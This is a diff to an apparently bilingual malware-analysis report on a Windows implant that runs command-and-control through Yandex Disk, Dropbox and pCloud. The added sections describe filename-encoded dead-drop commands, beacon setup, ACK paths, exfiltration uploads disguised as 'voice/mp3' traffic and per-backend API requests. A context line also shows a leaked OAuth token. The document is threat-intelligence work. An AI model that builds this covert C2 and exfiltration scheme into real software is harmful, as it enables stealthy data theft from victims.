@@ -260,7 +260,7 @@ for (i = 0; i < 100; i++) {
     }
 
     if (entry < unk_1400F60C8) {
-        dword_1400FDD8C = entry->flag;  // select active backend (Yandex)
+        dword_1400FDD8C = entry->flag;  // select active backend
         sub_14001B750(&main_req, flag, token, L"real", L"pack", L"team");  // live mode
         break;
     }
@@ -460,9 +460,102 @@ y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw
 
 **Cloud folder structure**
 
-- `/Program/<host_id>/...` — command polling / ACK
+- `/Program/<host_id>/...` — command execution ACK (not the polling path; see below)
 - `/Comment/<XXXX>292ACC33D2<XXXX>` — data exfiltration
 - `292ACC33D2` is the unique campaign/build ID embedded in all exfiltration paths
+
+### C2 Polling & Communication Mechanism
+
+#### Credential Table Layout
+
+The C2 credential table is stored at `g_c2_server_slots` (`0x1400F5CC0`), with each entry occupying **516 bytes** (129 × `DWORD`). OAuth tokens reside in the parallel array `g_yandex_oauth_tokens` (`0x1400F5CC4`). The `flag` field in each entry determines the backend type:
+
+| Flag | Backend |
+| --- | --- |
+| `1` | LocalFS (internal test / fallback) |
+| `3` | Dropbox |
+| `4` | pCloud |
+| `5` | Yandex Disk |
+
+Maximum fallback window: **100 iterations × 10 s sleep = ~16.7 minutes**.
+
+#### Two-Phase Beacon Initialization
+
+```c
+// Phase 1 — Probe: enumerate reachable backends
+c2_session_set_target(session, flag, token,
+    L"virtual", L"test", L"key");
+c2_session_recv_response(session, L"/", &count, &err);  // poll root dir
+
+// Phase 2 — Commit: switch to operational parameters on first success
+c2_session_set_target(g_c2_session_object, active_flag, active_token,
+    L"real", L"pack", L"team");
+```
+
+`L"pack"` and `L"team"` are folder-path components within the cloud storage directory used for live command delivery.
+
+#### Dead-Drop Command Delivery (Filename Encoding)
+
+C2 commands are not embedded in file content. The **first character of a filename** placed in the designated cloud folder encodes the command — a classic dead-drop technique.
+
+**Yandex Disk polling request:**
+```
+GET https://cloud-api.yandex.net/v1/disk/resources?path=<poll_path>&limit=500
+Authorization: OAuth y0__...
+```
+
+**Parsed JSON fields (`_embedded.items[]`):**
+
+| Field | Role |
+| --- | --- |
+| `name[0]` | **Command code** (single ASCII byte) |
+| `type` | `"file"` or `"dir"` |
+| `path` | Full cloud path of the item |
+| `size` | File size |
+| `modified` | Last-modified timestamp |
+
+The same dead-drop mechanism applies to Dropbox (`POST /2/files/list_folder`) and pCloud (`GET /listfolder`).
+
+**Authentication error detection in JSON response:**
+
+| Substring | Meaning | Action |
+| --- | --- | --- |
+| `nauthorizedError` | OAuth token revoked / expired | Advance to next credential slot |
+| `Error` | General API error | Advance to next credential slot |
+
+#### `/Program/<host_id>` — ACK Path, Not Polling Path
+
+The path `/Program/<g_main_id>` is exclusively used to **acknowledge completed command execution** — it is not where the bot polls for new commands. After each command is dispatched, `build_path_program_hostid` constructs this path and calls `cloud_api_send_ack`:
+
+```c
+// build_path_program_hostid @ 0x140012C54
+wsprintfW(path, L"/%s/%s", L"Program", &g_main_id);
+cloud_api_send_ack(&g_c2_session_object, path);   // called after every command
+```
+
+`g_main_id` is the 16-character hex machine identifier generated at startup (`%04X%04X%08X` format). The operator can correlate ACKs with specific implant instances by folder name alone.
+
+#### Data Exfiltration — `Content-Type: voice/mp3` Disguise
+
+Upload requests to all three backends carry a hardcoded `Content-Type: voice/mp3` header (`0x1400D3938`), disguising encrypted exfiltration traffic as an audio stream:
+
+```http
+PUT /v1/disk/resources/upload?path=/Comment/XXXX292ACC33D2XXXX
+Authorization: OAuth y0__...
+Content-Type: voice/mp3
+
+--wwjaughalvncjwiajs--
+[AES-128-CBC encrypted payload]
+--wwjaughalvncjwiajs----
+```
+
+#### Backend API Endpoint Summary
+
+| Backend | Command Polling | Data Upload | Auth Header |
+| --- | --- | --- | --- |
+| **Yandex Disk** | `GET cloud-api.yandex.net/v1/disk/resources?path=<P>&limit=500` | `PUT cloud-api.yandex.net/v1/disk/resources/upload` | `OAuth y0__...` |
+| **Dropbox** | `POST api.dropboxapi.com/2/files/list_folder` | `POST content.dropboxapi.com/2/files/upload` | `Bearer <token>` |
+| **pCloud** | `GET api.pcloud.com/listfolder` | `POST api.pcloud.com/uploadfile` | OAuth access_token |
 
 ### Cryptographic System
 
@@ -475,7 +568,7 @@ SPKI SHA256   : 62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326
 Modulus SHA256: 3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae
 ```
 
-`e=17` is anomalous: standard RSA uses `e=65537`, and this value indicates the threat actor used a custom key generation tool rather than standard utilities such as OpenSSL.
+`e=17` is a valid Fermat prime (F3) and is mathematically sound for RSA. While most implementations default to `e=65537` (F4), standard utilities such as OpenSSL support explicit exponent specification, making `e=17` key generation achievable without any custom tooling. The choice therefore indicates that the threat actor deliberately specified a non-default public exponent — an intentional deviation from convention, but not necessarily evidence of a bespoke key generation utility.
 
 **Encrypted communication flow**
 
@@ -836,7 +929,7 @@ fopen + fread → 추가 파일 읽기
     }
 
     if (entry &lt; unk_1400F60C8) {
-        dword_1400FDD8C = entry-&gt;flag;  // 활성 백엔드(Yandex) 선택
+        dword_1400FDD8C = entry-&gt;flag;  // 활성 백엔드 선택
         sub_14001B750(&amp;main_req, flag, token, L&quot;real&quot;, L&quot;pack&quot;, L&quot;team&quot;);  // 실제 모드
         break;
     }
@@ -861,7 +954,7 @@ if (i != 100 &amp;&amp; !sub_140012CD8()) {  // 명령 디스패처
 </ul>
 <pre class="highlight"><code class="language-c">_BOOL8 sub_1400156A8()
 {
-    // [Phase 0] 토글 체크 — 'O'/'I' 명령으로 제어
+    // [Phase 0] 토글 체크 — '0'/'i' 명령으로 제어
     if (!byte_1400F5CB0)
         return 1;                                       // 비활성 시 성공 리턴
 
@@ -1130,10 +1223,163 @@ y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw
 
 <p><strong>클라우드 폴더 구조</strong></p>
 <ul>
-<li><code>/Program/&amp;lt;host_id&amp;gt;/...</code> — 명령 폴링 / ACK</li>
+<li><code>/Program/&amp;lt;host_id&amp;gt;/...</code> — 명령 실행 ACK 전용 경로 (폴링 경로 아님; 아래 참조)</li>
 <li><code>/Comment/&amp;lt;XXXX&amp;gt;**292ACC33D2**&amp;lt;XXXX&amp;gt;</code> — 파일 데이터 유출</li>
 <li><strong><code>292ACC33D2</code></strong>는 <strong>고유 캠페인/빌드 ID</strong></li>
 </ul>
+<h3><strong>C2 폴링 및 통신 메커니즘</strong></h3>
+<h4>자격증명 테이블 구조</h4>
+<p>C2 자격증명 테이블은 <code>g_c2_server_slots</code> (<code>0x1400F5CC0</code>)에 저장되며, 엔트리 stride는 <strong>516바이트</strong> (129 × <code>DWORD</code>)입니다. OAuth 토큰은 <code>g_yandex_oauth_tokens</code> (<code>0x1400F5CC4</code>)에 병렬 배열로 저장됩니다. 각 엔트리의 <code>flag</code> 필드가 백엔드 타입을 결정합니다:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>백엔드</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1</code></td>
+<td>LocalFS (내부 테스트/폴백)</td>
+</tr>
+<tr>
+<td><code>3</code></td>
+<td>Dropbox</td>
+</tr>
+<tr>
+<td><code>4</code></td>
+<td>pCloud</td>
+</tr>
+<tr>
+<td><code>5</code></td>
+<td>Yandex Disk</td>
+</tr>
+</tbody>
+</table>
+<p>최대 재시도 횟수: <strong>100회 × 10초 슬립 = 약 16.7분</strong> 후 포기.</p>
+<h4>비콘 2단계 초기화</h4>
+<pre class="highlight"><code class="language-c">// Phase 1 — 프로브: 연결 가능한 백엔드 탐색
+c2_session_set_target(session, flag, token,
+    L&quot;virtual&quot;, L&quot;test&quot;, L&quot;key&quot;);
+c2_session_recv_response(session, L&quot;/&quot;, &amp;count, &amp;err);  // 루트 디렉토리 폴링
+
+// Phase 2 — 활성 백엔드 확정 후 실 운영 모드 전환
+c2_session_set_target(g_c2_session_object, active_flag, active_token,
+    L&quot;real&quot;, L&quot;pack&quot;, L&quot;team&quot;);
+</code></pre>
+
+<p><code>L"pack"</code>, <code>L"team"</code> 은 클라우드 스토리지에서 명령 전달에 사용되는 폴더 경로 구성요소입니다.</p>
+<h4>Dead-Drop 명령 전달 (파일명 인코딩)</h4>
+<p>C2 명령은 파일 내용이 아닌 <strong>파일명의 첫 글자</strong>에 인코딩됩니다 — dead-drop 기법.</p>
+<p><strong>Yandex Disk 폴링 요청:</strong></p>
+<pre class="highlight"><code>GET https://cloud-api.yandex.net/v1/disk/resources?path=&amp;lt;폴링경로&amp;gt;&amp;limit=500
+Authorization: OAuth y0__...
+</code></pre>
+
+<p><strong>파싱 JSON 필드 (<code>_embedded.items[]</code>):</strong></p>
+<table>
+<thead>
+<tr>
+<th>필드</th>
+<th>역할</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name[0]</code></td>
+<td><strong>명령 코드</strong> (단일 ASCII 바이트)</td>
+</tr>
+<tr>
+<td><code>type</code></td>
+<td><code>"file"</code> 또는 <code>"dir"</code></td>
+</tr>
+<tr>
+<td><code>path</code></td>
+<td>해당 항목의 전체 클라우드 경로</td>
+</tr>
+<tr>
+<td><code>size</code></td>
+<td>파일 크기</td>
+</tr>
+<tr>
+<td><code>modified</code></td>
+<td>최종 수정 타임스탬프</td>
+</tr>
+</tbody>
+</table>
+<p>Dropbox (<code>POST /2/files/list_folder</code>)와 pCloud (<code>GET /listfolder</code>)도 동일한 dead-drop 방식입니다.</p>
+<p><strong>응답 내 인증 오류 감지:</strong></p>
+<table>
+<thead>
+<tr>
+<th>포함 문자열</th>
+<th>의미</th>
+<th>처리</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nauthorizedError</code></td>
+<td>OAuth 토큰 만료/폐기</td>
+<td>다음 자격증명 슬롯으로 폴백</td>
+</tr>
+<tr>
+<td><code>Error</code></td>
+<td>API 일반 오류</td>
+<td>다음 자격증명 슬롯으로 폴백</td>
+</tr>
+</tbody>
+</table>
+<h4><code>/Program/&amp;lt;host_id&amp;gt;</code> — ACK 경로 (폴링 경로 아님)</h4>
+<p><code>/Program/&amp;lt;g_main_id&amp;gt;</code> 경로는 명령 폴링에 쓰이지 않습니다. 명령 실행 완료 후 C2에 전송하는 <strong>ACK 전용 경로</strong>입니다. 명령이 처리될 때마다 <code>build_path_program_hostid</code>가 이 경로를 조립하고 <code>cloud_api_send_ack</code>를 호출합니다:</p>
+<pre class="highlight"><code class="language-c">// build_path_program_hostid @ 0x140012C54
+wsprintfW(path, L&quot;/%s/%s&quot;, L&quot;Program&quot;, &amp;g_main_id);
+cloud_api_send_ack(&amp;g_c2_session_object, path);   // 모든 명령 처리 후 호출
+</code></pre>
+
+<p><code>g_main_id</code>는 시작 시 생성되는 16자 hex 머신 식별자(<code>%04X%04X%08X</code>)입니다. 공격자는 폴더명만으로 어느 감염 호스트의 ACK인지 식별합니다.</p>
+<h4>데이터 유출 — <code>Content-Type: voice/mp3</code> 위장</h4>
+<p>세 클라우드 백엔드 모두 하드코딩된 <code>Content-Type: voice/mp3</code> 헤더(<code>0x1400D3938</code>)를 사용해 암호화된 유출 트래픽을 오디오 스트리밍처럼 위장합니다:</p>
+<pre class="highlight"><code class="language-http">PUT /v1/disk/resources/upload?path=/Comment/XXXX292ACC33D2XXXX
+Authorization: OAuth y0__...
+Content-Type: voice/mp3
+
+--wwjaughalvncjwiajs--
+[AES-128-CBC 암호화 페이로드]
+--wwjaughalvncjwiajs----
+</code></pre>
+
+<h4>백엔드별 API 엔드포인트</h4>
+<table>
+<thead>
+<tr>
+<th>백엔드</th>
+<th>명령 폴링</th>
+<th>데이터 업로드</th>
+<th>인증 헤더</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Yandex Disk</strong></td>
+<td><code>GET cloud-api.yandex.net/v1/disk/resources?path=&lt;P&gt;&amp;limit=500</code></td>
+<td><code>PUT cloud-api.yandex.net/v1/disk/resources/upload</code></td>
+<td><code>OAuth y0__...</code></td>
+</tr>
+<tr>
+<td><strong>Dropbox</strong></td>
+<td><code>POST api.dropboxapi.com/2/files/list_folder</code></td>
+<td><code>POST content.dropboxapi.com/2/files/upload</code></td>
+<td><code>Bearer &amp;lt;token&amp;gt;</code></td>
+</tr>
+<tr>
+<td><strong>pCloud</strong></td>
+<td><code>GET api.pcloud.com/listfolder</code></td>
+<td><code>POST api.pcloud.com/uploadfile</code></td>
+<td>OAuth access_token</td>
+</tr>
+</tbody>
+</table>
 <h3><strong>암호 시스템</strong></h3>
 <p><strong>임베디드 RSA 공개키</strong></p>
 <pre class="highlight"><code>Modulus size  : 2048-bit
@@ -1142,11 +1388,8 @@ SPKI SHA256   : 62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326
 Modulus SHA256: 3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae
 </code></pre>
 
-<p><strong><code>e=17</code></strong>은 비정상</p>
-<ul>
-<li>표준 RSA는 <code>e=65537</code> 사용</li>
-<li><code>e=17</code>은 공격자가 표준 도구가 아닌 자체 키 생성 도구를 사용한 흔적</li>
-</ul>
+<p><strong><code>e=17</code> 비표준 공개 지수</strong></p>
+<p><code>e=17</code>은 페르마 소수(F3)로, 수학적으로 유효한 RSA 공개 지수입니다. 대부분의 구현이 기본값으로 <code>e=65537</code>(F4)을 사용하지만, OpenSSL 등 표준 도구에서도 지수를 명시적으로 지정하면 <code>e=17</code> 키를 생성할 수 있습니다. 따라서 자체 키 생성 도구의 증거라기보다는, 공격자가 키 생성 파라미터를 <strong>의도적으로 비표준 값으로 지정</strong>했음을 시사합니다.</p>
 <p><strong>암호 통신 흐름</strong></p>
 <pre class="highlight"><code>업로드:
   1. AES-128-CBC(session_key, random IV)로 평문 암호화
